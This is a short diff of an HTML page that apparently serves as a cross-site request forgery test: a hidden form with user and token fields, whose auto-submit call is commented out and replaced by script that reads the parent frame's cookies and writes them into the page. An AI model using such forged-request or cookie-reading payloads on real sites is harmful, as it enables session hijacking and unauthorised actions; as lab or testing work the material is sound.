@@ -5,8 +5,14 @@
         <input type="hidden" name="userId" value="1a6d40a6607d9267269433a744c7b1182ebb294f">
 	    <input type="hidden" name="csrfToken" value="-2250727477224450306662739289221030021">
     </form>
+    <body>
+        <span id="hej"></span>
+    </body>
     <script>
-	    document.getElementById('csrfForm').submit();
+
+        let a = parent.document.cookie;
+        document.getElementById('hej').innerHTML = a;
+	    //document.getElementById('csrfForm').submit();
     </script>
 </body>
 </html>
